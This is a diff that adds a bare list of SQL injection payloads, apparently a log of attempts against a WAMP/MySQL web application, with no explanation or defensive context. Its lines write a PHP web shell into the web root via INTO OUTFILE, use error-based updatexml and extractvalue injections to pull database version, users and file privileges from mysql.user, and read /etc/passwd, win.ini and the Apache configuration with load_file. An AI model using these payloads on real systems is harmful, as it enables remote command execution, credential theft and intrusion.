@@ -1,0 +1,34 @@
+ID:1' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:/wamp64/www/shell.php'-- 
+ID:1' UNION SELECT "<?php system($_GET['cmd']); ?>",2,3 INTO OUTFILE 'C:/wamp64/www/shell.php'-- 
+ID:1' AND updatexml(1,concat(version()))
+ID:1' AND updatexml(1,concat(version()),1)
+ID:1' or updatexml(1,concat(version()),1)
+ID:1' or updatexml(1, concat(0x7e, version(), 0x7e), 1)-- 
+ID:1' or updatexml(1, concat(0x7e, user(), 0x7e), 1)-- 
+ID:1' or updatexml(1, concat(0x7e, version(), 0x7e), 1)-- 
+ID:1' or updatexml(1,(select load_file('/etc/passwd'),1)
+ID:1' or updatexml(1,(select load_file('C:\\\\Windows\\\\win.ini'),1)
+ID:1' AND updatexml(1,concat(0x7e,(SELECT load_file('C:\\Windows\\win.ini')),0x7e),1)--
+ID:1' AND updatexml(1,concat(0x7e,(SELECT load_file('C:\\\\Windows\\\\win.ini')),0x7e),1)-- 
+ID:1' or updatexml(1,concat(version()),1)
+ID:1' or updatexml(1,concat(version()),1)-- 
+ID:1' or updatexml(1,version(),1)-- 
+ID:1' or updatexml(0x6e,version(),0x7e)-- 
+ID:1' or updatexml(0x7e,version(),0x7e)-- 
+ID:1' or updatexml(1,concat(0x7e,version(),0x7e),1)-- 
+ID:1' or updatexml(1,concat(0x7e,(select user from mysql.user limit 0,1),0x7e),1)-- 
+ID:1' or updatexml(1,concat(0x7e,(select GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e),0x7e),1)-- 
+ID:1' or updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e) FROM mysql.user),0x7e),1)-- 
+ID:1' or updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e) FROM mysql.user LIMIT 0,1),0x7e),1)-- 
+ID:1' or updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e) FROM mysql.user LIMIT 0,10),0x7e),1)-- 
+ID:1' or updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e) FROM mysql.user LIMIT 10,20),0x7e),1)-- 
+ID:0' or updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e) FROM mysql.user LIMIT 10,20),0x7e),1)-- 
+ID:0' or updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e) FROM mysql.user LIMIT 1,20),0x7e),1)-- 
+ID:1' or updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e) FROM mysql.user),0x7e),1)-- 
+ID:0' union select 1,@@datadir,1-- 
+ID:0' union select 1,load_file('C:\\wamp64\\bin\\apache\\apache2.4.62.1\\conf\\httpd.conf'),1-- 
+ID:' UNION select 1,1,@@secure_file_priv -- 
+ID:0' UNION select 1,1,@@secure_file_priv -- 
+ID:0' UNION select 1,1,@@port -- 
+ID:0' UNION select 1,1,@@datadir -- 
+ID:1' AND extractvalue(1, concat(0x7e, @@character_set_connection)) -- 
